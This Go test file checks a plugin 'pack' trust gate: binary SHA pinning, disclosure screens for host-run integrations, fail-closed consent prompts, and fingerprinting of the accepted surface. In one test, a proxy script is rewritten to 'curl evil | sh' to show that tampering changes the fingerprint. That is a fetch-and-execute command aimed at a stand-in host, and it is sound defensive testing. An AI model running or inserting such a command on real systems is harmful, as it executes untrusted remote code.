// pack_v2_phase2_test.go — packs-v2 Phase 2: F5 Tier-1 trust gate
// (docs/design/packs-v2-impl.md; trust model packs.md §9). The F3 host-wrapper
// install fitness this file used to cover was deleted with `pix host` (the
// unsandboxed escape hatch) — see workflow/pack/host.go's doc comment for what
// survives (bin-sha verification + stale-wrapper cleanup).
//
// Fitness functions covered here:
//   - [[bin]] sha mismatch refuses at install AND at activation
//   - Tier-1 adopt prompts; non-TTY fails closed without --yes; Tier-0 silent
//   - BoM enumerates every host-exec facet + egress + credential names
package pack

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"pix/host/config"
)

// sha256Hex is the test-side hash of raw bytes (for authoring valid pins).
func sha256Hex(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// acceptPackSurface records pack root's CURRENT host-exec surface as accepted
// in the HOST trust store — the test-side stand-in for saying yes at the
// Tier-1 gate. PIX_CONFIG must already point into a temp dir.
func acceptPackSurface(t *testing.T, root, cfgGogAccount string) {
	t.Helper()
	p, err := LoadPack(root)
	if err != nil {
		t.Fatal(err)
	}
	fp, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(p, cfgGogAccount, PackLocalMCP()))
	if err != nil {
		t.Fatal(err)
	}
	store, err := loadPackTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	store.RecordAcceptance(store.TrustKey(root), PackTrustRecord{Path: CanonicalizePackRoot(root), Fingerprint: fp})
	if err := store.Save(); err != nil {
		t.Fatal(err)
	}
}

// --- F5: ComputeHostBoM ---------------------------------------------------------

// TestComputeHostBoM_EnumeratesEveryHostExecFacet: the BoM lists every LOCAL
// MCP (with the resolved serverCmd argv), every host wrapper, every host=true
// [[bin]] (path+sha), the egress union across ALL proxies (sandbox egress
// informs the screen even though it never raises the tier), and credential
// VAR names — never values. The classifier here marks both names LOCAL (the
// Tier-1 case); the remote/reference-only partition half is pinned by
// TestComputeHostBoM_RemoteMCPReferenceRequiresConsent.
func TestComputeHostBoM_EnumeratesEveryHostExecFacet(t *testing.T) {
	p := &Info{Root: "/p", Manifest: Manifest{
		Name: "work",
		Integrations: []Integration{
			{Name: "Fastmail", MCP: "fastmail", Env: "FASTMAIL_TOKEN"},
			{Name: "gog", MCP: config.GWServerName, Env: "GOG_KEYRING"},
		},
		Proxies: []PackProxy{
			{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}},
			{Name: "warehouse", Egress: []string{"warehouse.example.test"}},
		},
		Bins:          []packBin{{Name: "fastmail-mcp", Path: "bin/fastmail-mcp", SHA: "9F2C", Host: true}},
		Prerequisites: []string{"VPN connected"},
	}}
	b := ComputeHostBoM(p, "", func(string) bool { return true })
	if !b.Tier1() {
		t.Fatal("a pack with mcp + host proxy + bin must be Tier-1")
	}
	if len(b.MCP) != 2 || b.MCP[0].Name != "fastmail" || b.MCP[1].Name != config.GWServerName {
		t.Errorf("BoM mcp = %+v", b.MCP)
	}
	if got := strings.Join(b.MCP[0].Argv, " "); got != "pix-host mcp fastmail" {
		t.Errorf("fastmail argv = %q (must be the real serverCmd shape)", got)
	}
	if got := strings.Join(b.MCP[1].Argv, " "); !strings.Contains(got, "--gmail-no-send") || !strings.Contains(got, "--readonly") {
		t.Errorf("gog argv must carry the hardened flags, got %q", got)
	}
	if len(b.Proxies) != 1 || b.Proxies[0] != "platformio" {
		t.Errorf("BoM host proxies = %v", b.Proxies)
	}
	if len(b.SandboxProxies) != 1 || b.SandboxProxies[0].Name != "warehouse" {
		t.Errorf("BoM sandbox proxies = %+v", b.SandboxProxies)
	}
	if len(b.Bins) != 1 || b.Bins[0].Name != "fastmail-mcp" {
		t.Errorf("BoM bins = %+v", b.Bins)
	}
	wantEgress := []string{"api.registry.platformio.org", "warehouse.example.test"}
	if strings.Join(b.Egress, ",") != strings.Join(wantEgress, ",") {
		t.Errorf("BoM egress = %v, want the sorted union %v", b.Egress, wantEgress)
	}
	if strings.Join(b.Creds, ",") != "FASTMAIL_TOKEN,GOG_KEYRING" {
		t.Errorf("BoM creds = %v (VAR names only)", b.Creds)
	}
	if strings.Join(b.Prerequisites, ",") != "VPN connected" {
		t.Errorf("BoM prerequisites = %v", b.Prerequisites)
	}
}

func TestValidatePackFacetsRejectsAmbiguousIntegrationExecution(t *testing.T) {
	cases := []struct {
		name         string
		integrations []Integration
	}{
		{"duplicate MCP", []Integration{{MCP: "sneaky", Image: "safe"}, {MCP: "sneaky", Manifest: "https://evil.invalid/server.json"}}},
		{"multiple execution kinds", []Integration{{MCP: "sneaky", Image: "safe", Manifest: "https://evil.invalid/server.json"}}},
		{"manifest with ignored env", []Integration{{MCP: "sneaky", Manifest: "https://example.invalid/server.json", Env: "TOKEN"}}},
		{"remote URL with ignored env keys", []Integration{{MCP: "sneaky", URL: "https://example.invalid/mcp", EnvKeys: []string{"TOKEN"}}}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			m := &Manifest{Integrations: tc.integrations}
			if err := validatePackFacets(t.TempDir(), m); err == nil {
				t.Fatal("ambiguous integration passed validation; trust rendering and execution could disagree")
			}
		})
	}
}

func TestComputeHostBoM_DisclosesContainerAndRemoteIntegrations(t *testing.T) {
	p := &Info{Root: "/p", Manifest: Manifest{
		Name: "docker-work",
		Integrations: []Integration{
			{Name: "HR", MCP: "hr", Image: "hr-mcp:0.0.1", Env: "HR_API_KEY", EnvValues: map[string]string{"HR_COMPANY_DOMAIN": "acme"}},
			{Name: "Meetings", MCP: "meetings", URL: "https://app.trymeetings.com/mcp"},
		},
	}}
	b := ComputeHostBoM(p, "", func(string) bool { return false })
	if !b.Tier1() {
		t.Fatal("a host-run MCP container must require the adoption gate")
	}
	if len(b.Containers) != 1 || b.Containers[0].Name != "hr" || b.Containers[0].Image != "hr-mcp:0.0.1" {
		t.Fatalf("container disclosure = %+v", b.Containers)
	}
	if got := strings.Join(b.Containers[0].EnvKeys, ","); got != "HR_API_KEY" {
		t.Errorf("container env disclosure = %q", got)
	}
	if b.Containers[0].EnvValues["HR_COMPANY_DOMAIN"] != "acme" {
		t.Errorf("container literal env disclosure = %+v", b.Containers[0].EnvValues)
	}
	if len(b.RemoteMCP) != 1 || b.RemoteMCP[0].Name != "meetings" || b.RemoteMCP[0].URL != "https://app.trymeetings.com/mcp" {
		t.Fatalf("remote disclosure = %+v", b.RemoteMCP)
	}
	var out bytes.Buffer
	renderHostBoM(&out, b)
	text := out.String()
	for _, want := range []string{"HR", "hr-mcp:0.0.1", "HR_API_KEY", "Meetings", "https://app.trymeetings.com/mcp"} {
		if !strings.Contains(strings.ToLower(text), strings.ToLower(want)) {
			t.Errorf("trust screen omitted %q:\n%s", want, text)
		}
	}
}

// TestComputeHostBoM_Tier0: skills/knowledge/sandbox-proxy-only packs have no
// host-exec facet — egress and creds alone never raise the tier.
func TestComputeHostBoM_Tier0(t *testing.T) {
	p := &Info{Root: "/p", Manifest: Manifest{
		Name:         "personal",
		Proxies:      []PackProxy{{Name: "warehouse", Egress: []string{"warehouse.example.test"}}},
		Integrations: []Integration{{Name: "ref-only", Env: "SOME_TOKEN"}}, // env but NO mcp
	}}
	b := ComputeHostBoM(p, "", func(string) bool { return true })
	if b.Tier1() {
		t.Errorf("no mcp, no host proxy, no bin must be Tier-0, got %+v", b)
	}
	if len(b.SandboxProxies) != 1 || b.SandboxProxies[0].Name != "warehouse" {
		t.Fatalf("sandbox proxy disclosure = %+v", b.SandboxProxies)
	}
	var out bytes.Buffer
	renderHostBoM(&out, b)
	for _, want := range []string{"Sandbox command:", "warehouse", "warehouse.example.test"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("trust screen omitted %q:\n%s", want, out.String())
		}
	}
}

func TestRenderHostBoM_UsesExecutionBoundariesAndSetupDescriptions(t *testing.T) {
	b := hostBoM{
		MCP:           []hostBoMMCP{{Name: "chat", Argv: []string{"pix-host", "mcp", "chat"}}},
		Containers:    []hostBoMContainer{{Name: "people", Image: "people-mcp:1"}},
		RemoteMCP:     []hostBoMRemote{{Name: "docs", URL: "https://docs.example.test/mcp"}},
		Setup:         []packSetupStep{{ID: "chat", Description: "Authorize chat", Path: "setup/chat", ApplyArgs: []string{"apply"}, Required: true}},
		Prerequisites: []string{"Your VPN is connected"},
	}
	var out bytes.Buffer
	renderHostBoM(&out, b)
	text := out.String()
	for _, want := range []string{"Host MCP:", "people (image people-mcp:1)", "Remote MCP:", "Ensures:", "Authorize chat", "Before continuing", "Your VPN is connected"} {
		if !strings.Contains(text, want) {
			t.Errorf("trust screen omitted %q:\n%s", want, text)
		}
	}
}

// --- F5: the gate itself ----------------------------------------------------------

func TestPackTrustGate_FailClosedMatrix(t *testing.T) {
	bom := hostBoM{Proxies: []string{"platformio"}}
	cases := []struct {
		name   string
		tty    bool
		yes    bool
		answer string
		wantOK bool
	}{
		{"non-tty without --yes fails closed", false, false, "", false},
		{"non-tty with --yes accepts", false, true, "", true},
		{"tty yes accepts", true, false, "y\n", true},
		{"tty YES accepts", true, false, "YES\n", true},
		{"tty empty answer defaults to No", true, false, "\n", false},
		{"tty n refuses", true, false, "n\n", false},
		{"tty EOF refuses", true, false, "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			var out bytes.Buffer
			err := packTrustGate(strings.NewReader(c.answer), &out, c.tty, c.yes, "work", bom)
			if (err == nil) != c.wantOK {
				t.Errorf("gate(tty=%v yes=%v answer=%q) err=%v, wantOK=%v", c.tty, c.yes, c.answer, err, c.wantOK)
			}
			if !strings.Contains(out.String(), "platformio") {
				t.Errorf("the BoM screen must name every host wrapper, got:\n%s", out.String())
			}
		})
	}
}

// TestHostExecFingerprint: the acceptance fingerprint covers the FULL host-exec
// surface — identical surface → identical fingerprint (no re-prompt on
// re-activation), while ANY change (a new mcp, a changed gog account resolved
// into the argv, a mutated host proxy SCRIPT, a changed [[bin]] sha) produces
// a different fingerprint and re-triggers the gate. Name-only coverage (the
// old lock model's flaw) is structurally impossible here.
func TestHostExecFingerprint(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\necho ok\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	base := Manifest{
		Name:         "work",
		Integrations: []Integration{{Name: "gog", MCP: config.GWServerName, Env: "GOG_KEYRING"}},
		Proxies:      []PackProxy{{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}}},
		Bins:         []packBin{{Name: "fm", Path: "bin/fm", SHA: "aaaa", Host: true}},
	}
	fpOf := func(account string, m Manifest) string {
		t.Helper()
		// Classifier: every declared mcp name is LOCAL here — this test pins
		// the fingerprint's coverage of the host-spawned MCP surface.
		fp, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(&Info{Root: root, Manifest: m}, account, func(string) bool { return true }))
		if err != nil {
			t.Fatalf("fingerprint: %v", err)
		}
		return fp
	}
	fp0 := fpOf("a@example.com", base)
	if fpOf("a@example.com", base) != fp0 {
		t.Error("identical surface must produce an identical fingerprint (no re-prompt)")
	}
	if fpOf("b@example.com", base) == fp0 {
		t.Error("a changed gog account (→ changed resolved MCP argv) must change the fingerprint")
	}
	m := base
	m.Bins = []packBin{{Name: "fm", Path: "bin/fm", SHA: "bbbb", Host: true}}
	if fpOf("a@example.com", m) == fp0 {
		t.Error("a CHANGED [[bin]] sha must change the fingerprint")
	}
	m = base
	m.Integrations = append([]Integration{{Name: "New", MCP: "new-mcp"}}, base.Integrations...)
	if fpOf("a@example.com", m) == fp0 {
		t.Error("a NEW mcp must change the fingerprint")
	}
	// Mutate the host proxy script: the CONTENT is pinned, not just the name.
	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if fpOf("a@example.com", base) == fp0 {
		t.Error("a MUTATED host proxy script must change the fingerprint")
	}
	// A missing/unreadable script fails closed (nothing to accept or install).
	if err := os.Remove(filepath.Join(root, "bin", "platformio")); err != nil {
		t.Fatal(err)
	}
	if _, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(&Info{Root: root, Manifest: base}, "", func(string) bool { return true })); err == nil {
		t.Error("a missing host proxy script must fail the fingerprint (fail closed)")
	}
}

// --- F5: end-to-end through RunPackUse -------------------------------------------

// TestPackUse_Tier1NonTTYFailsClosed (fitness #5): a Tier-1 `pack use` on a
// non-TTY without --yes exits non-zero and registers NOTHING — no config
// commit, no acceptance recorded. Subprocess because RunPackUse os.Exits.
func TestPackUse_Tier1NonTTYFailsClosed(t *testing.T) {
	if os.Getenv("PIX_TEST_PHASE2") == "tier1-nontty" {
		// The pack's mcp must classify as a LOCAL host command for Tier-1
		// (round-2 C: a remote reference no longer gates).
		RunPackUse(localMCPEnv("fastmail"), os.Stdout, []string{os.Getenv("PIX_TEST_PACK_ROOT")}, registerOK)
		return // exit 0 == the gate did NOT fail closed
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, Manifest{Name: "work", Schema: 1,
		Integrations: []Integration{{Name: "Fastmail", MCP: "fastmail", Env: "FASTMAIL_TOKEN"}}})

	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_Tier1NonTTYFailsClosed$")
	// A pipe stdin (NOT the inherited /dev/null, which Stat()s as a char
	// device) so the child's isTTY is deterministically false — the exact
	// CI/script shape the fail-closed contract is about.
	cmd.Stdin = strings.NewReader("")
	cmd.Env = append(os.Environ(),
		"PIX_TEST_PHASE2=tier1-nontty",
		"PIX_TEST_PACK_ROOT="+root,
		"PIX_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("Tier-1 non-TTY adopt without --yes must exit non-zero; output:\n%s", out)
	}
	if !strings.Contains(string(out), "--yes") {
		t.Errorf("the refusal must point at --yes, got:\n%s", out)
	}
	if !strings.Contains(string(out), "fastmail") {
		t.Errorf("the BoM screen must have printed the mcp, got:\n%s", out)
	}
	if _, serr := os.Stat(cfgPath); !os.IsNotExist(serr) {
		b, _ := os.ReadFile(cfgPath)
		t.Errorf("nothing may commit on refusal; config exists:\n%s", b)
	}
	if l := readPackLock(root); len(l.MCP) != 0 {
		t.Errorf("no attribution may be recorded on refusal, lock=%+v", l)
	}
	if _, serr := os.Stat(filepath.Join(dir, packTrustStoreName)); !os.IsNotExist(serr) {
		b, _ := os.ReadFile(filepath.Join(dir, packTrustStoreName))
		t.Errorf("no acceptance may be recorded on refusal; trust store exists:\n%s", b)
	}
}

// TestPackUse_Tier0StillSilent (fitness #5, other half): a Tier-0 pack adopts
// with NO prompt and NO BoM screen — unchanged Phase-1 behavior, in-process
// (a misfiring gate would os.Exit(1) and fail the whole test binary).
func TestPackUse_Tier0StillSilent(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, Manifest{Name: "personal", Schema: 1,
		Proxies: []PackProxy{{Name: "warehouse"}}}) // sandbox-only proxy: Tier-0
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "warehouse"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{root}, registerOK) // NO --yes, no TTY: must succeed
	if strings.Contains(out.String(), "[y/N]") || strings.Contains(out.String(), "adds these integrations to Pix") {
		t.Errorf("Tier-0 must adopt silently, got:\n%s", out.String())
	}
	cfg, _ := config.Load()
	if cfg.Pack != root {
		t.Errorf("Tier-0 pack did not activate, cfg.Pack=%q", cfg.Pack)
	}
}

// TestPackUse_AcceptanceSticksAcrossReactivation: after a --yes adoption the
// acceptance is recorded in the HOST trust store (never in the pack payload),
// so re-activating the SAME pack without --yes on a non-TTY succeeds (trust
// granted at adoption, no re-prompt). The mcp is pinned LOCAL so the pack is
// Tier-1 (round-2 C: a remote reference would not gate at all).
func TestPackUse_AcceptanceSticksAcrossReactivation(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	pinLocalMCP(t, "fastmail")
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, Manifest{Name: "work", Schema: 1,
		Integrations: []Integration{{Name: "Fastmail", MCP: "fastmail"}}})

	var out bytes.Buffer
	RunPackUse(localMCPEnv("fastmail"), &out, []string{root, "--yes"}, registerOK)
	store, serr := loadPackTrustStore()
	if serr != nil {
		t.Fatal(serr)
	}
	if _, ok := store.acceptedFingerprint(store.TrustKey(root)); !ok {
		t.Fatalf("acceptance not recorded in the host trust store: %+v", store)
	}
	// And NOTHING security-relevant landed inside the pack payload.
	if b, _ := os.ReadFile(PackLockPath(root)); strings.Contains(strings.ToLower(string(b)), "accepted") {
		t.Errorf("acceptance must never live inside the pack (pack.lock):\n%s", b)
	}
	// Reactivation without --yes on a non-TTY: a misfiring gate would
	// os.Exit(1) here and fail the whole test binary.
	out.Reset()
	RunPackUse(localMCPEnv("fastmail"), &out, []string{root}, registerOK)
	if strings.Contains(out.String(), "adds these integrations to Pix") {
		t.Errorf("covered BoM must not re-render the gate screen:\n%s", out.String())
	}
}

// TestPackUse_NewHostFacetRetriggersGate: a host-exec facet ADDED after
// adoption is not covered by the old acceptance — the next `pack use` fails
// closed again on a non-TTY. Subprocess (RunPackUse os.Exits on refusal).
func TestPackUse_NewHostFacetRetriggersGate(t *testing.T) {
	if os.Getenv("PIX_TEST_PHASE2") == "regate" {
		RunPackUse(fakeGitEnv(nil), os.Stdout, []string{os.Getenv("PIX_TEST_PACK_ROOT")}, registerOK)
		return
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	t.Setenv("PIX_CONFIG", cfgPath)
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, Manifest{Name: "work", Schema: 1,
		Integrations: []Integration{{Name: "Fastmail", MCP: "fastmail"}}})
	var out bytes.Buffer
	RunPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}, registerOK) // adopt + accept

	// The manifest gains a host wrapper AFTER adoption.
	mustWritePack(t, root, Manifest{Name: "work", Schema: 1,
		Integrations: []Integration{{Name: "Fastmail", MCP: "fastmail"}},
		Proxies:      []PackProxy{{Name: "platformio", Host: true}}})
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_NewHostFacetRetriggersGate$")
	cmd.Stdin = strings.NewReader("") // pipe stdin: deterministically non-TTY
	cmd.Env = append(os.Environ(),
		"PIX_TEST_PHASE2=regate",
		"PIX_TEST_PACK_ROOT="+root,
		"PIX_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	cmdOut, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("a NEW host facet must re-trigger the gate (fail closed non-TTY); output:\n%s", cmdOut)
	}
	if !strings.Contains(string(cmdOut), "platformio") {
		t.Errorf("the re-fired BoM must name the new wrapper, got:\n%s", cmdOut)
	}
}

// TestPackUse_BinShaMismatchRefusesActivation (fitness #4, install half): a
// [[bin]] whose file does not hash to its pinned sha refuses `pack use`
// OUTRIGHT — even with --yes, before anything commits.
func TestPackUse_BinShaMismatchRefusesActivation(t *testing.T) {
	if os.Getenv("PIX_TEST_PHASE2") == "binsha" {
		RunPackUse(fakeGitEnv(nil), os.Stdout, []string{os.Getenv("PIX_TEST_PACK_ROOT"), "--yes"}, registerOK)
		return
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	root := filepath.Join(dir, "pack")
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "fm"), []byte("tampered"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWritePack(t, root, Manifest{Name: "work", Schema: 1,
		Bins: []packBin{{Name: "fm", Path: "bin/fm", SHA: sha256Hex([]byte("the pinned bytes")), Host: true}}})

	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_BinShaMismatchRefusesActivation$")
	cmd.Env = append(os.Environ(),
		"PIX_TEST_PHASE2=binsha",
		"PIX_TEST_PACK_ROOT="+root,
		"PIX_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("a sha-mismatched [[bin]] must refuse activation; output:\n%s", out)
	}
	if !strings.Contains(string(out), "mismatch") {
		t.Errorf("expected a mismatch refusal, got:\n%s", out)
	}
	if _, serr := os.Stat(cfgPath); !os.IsNotExist(serr) {
		t.Error("nothing may commit when the pinned binary is tampered")
	}
}

// TestVerifyPackBinSHA_Contract (restored, U03B review finding: verifyPackBinSHA
// is generic [[bin]] sha-pin verification used at `pack use`, not host-mode-
// specific execution) pins the fail-closed contract directly: an empty sha
// refuses as unpinned, a mismatched sha refuses, a missing file refuses (it
// cannot be verified), and a correct sha (case-insensitively) passes.
func TestVerifyPackBinSHA_Contract(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	data := []byte("binary bytes")
	if err := os.WriteFile(filepath.Join(dir, "bin", "fm"), data, 0o755); err != nil {
		t.Fatal(err)
	}
	sha := sha256Hex(data)
	if err := verifyPackBinSHA(dir, packBin{Name: "fm", Path: "bin/fm"}); err == nil || !strings.Contains(err.Error(), "SHA-pinned") {
		t.Errorf("empty sha must refuse as unpinned, got %v", err)
	}
	if err := verifyPackBinSHA(dir, packBin{Name: "fm", Path: "bin/fm", SHA: "0000dead"}); err == nil || !strings.Contains(err.Error(), "mismatch") {
		t.Errorf("wrong sha must refuse with a mismatch, got %v", err)
	}
	if err := verifyPackBinSHA(dir, packBin{Name: "gone", Path: "bin/gone", SHA: sha}); err == nil {
		t.Error("a missing file must refuse (cannot verify)")
	}
	if err := verifyPackBinSHA(dir, packBin{Name: "fm", Path: "bin/fm", SHA: strings.ToUpper(sha)}); err != nil {
		t.Errorf("correct (uppercase) sha must pass, got %v", err)
	}
}
